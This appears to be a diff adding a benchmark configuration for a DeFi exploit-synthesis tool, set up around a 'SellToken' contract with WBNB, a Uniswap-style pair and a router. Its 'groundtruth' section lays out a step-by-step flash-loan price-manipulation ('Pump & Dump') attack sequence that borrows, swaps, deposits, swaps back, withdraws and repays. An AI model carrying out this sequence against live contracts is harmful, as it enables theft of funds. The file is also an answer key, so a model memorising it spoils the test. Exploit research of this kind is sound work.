@@ -1,0 +1,88 @@
+# Information for benchmarks building.
+project_name: "SellToken"
+
+ctrt_name2cls:
+  - ["sellc", "SellToken"]
+  - ["wbnb", "WBNB"]
+  - ["usdt", "USDT"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+  - ["srouter", "SellTokenRouter"]
+
+ctrt_name2deploy:
+  - ["wbnb", "new WBNB ()"]
+  - ["usdt", "new USDT ()"]
+  - ["sellc", "new SellToken ()"]
+  - ["pair", ""]
+  - [
+      "factory", 
+      "new UniswapV2Factory(
+      address(wbnb),
+      address(pair),
+      address(0x0),
+      address(0x0)
+      )",
+    ]
+  - [
+      "router", 
+      "new UniswapV2Router(
+      address(factory), 
+      address(0x0))",
+    ]
+  - ["srouter", "new SellTokenRouter (address(wbnb), address(usdt), address(sellc), address(router))"]
+    
+extra_actions: 
+  - "function deposit_srouter_wbnb_sellc(uint256 amount) internal eurus {
+      srouter.setTokenPrice(address(sellc));  
+      IERC20(wbnb).transfer(address(srouter.mkt()), amount);
+      srouter.ShortStart(address(sellc), address(attacker), 1, amount);  
+    }"
+  - "function withdraw_srouter_sellc_wbnb(uint256 amount) internal eurus {
+       srouter.withdraw(address(sellc));
+    }"
+
+
+extra_deployments: 
+  - "sellc.transfer(address(srouter.mkt()), 1020918 ether);"
+
+
+extra_statements:
+  - "vm.warp(blockTimestamp);
+    vm.roll(26854757);"
+
+attack_goal_str: "wbnb;1e6"
+
+groundtruth:
+  - ["borrow", "wbnb", "owner", "428 ether"]
+  - ["swap", "pair", "attacker", "wbnb", "sellc", "wbnb.balanceOf(address(attacker)) * 99 / 100", "pair.getAmountOut((wbnb.balanceOf(address(attacker)) * 99) / 100, address(wbnb))"]
+  - ["deposit", "srouter", "wbnb", "sellc", "4 ether"]
+  - ["swap", "pair", "attacker", "sellc", "wbnb", "sellc.balanceOf(address(attacker))", "pair.getAmountOut(sellc.balanceOf(address(attacker)), address(sellc))"]
+  - ["withdraw", "srouter", "sellc", "wbnb", "0"]
+  - ["payback", "wbnb", "owner", "428 ether"]
+
+# Information for search space building.
+roles:
+  "wbnb":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "usdt":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "sellc":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "pair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["sellc", "wbnb"]
+    support_swaps:
+      "sellc": ["sellc", "wbnb"]
+      "wbnb": ["sellc", "wbnb"]
+    is_oracle: true
+    oracle: "pair"
+
+pattern: "Pump & Dump"
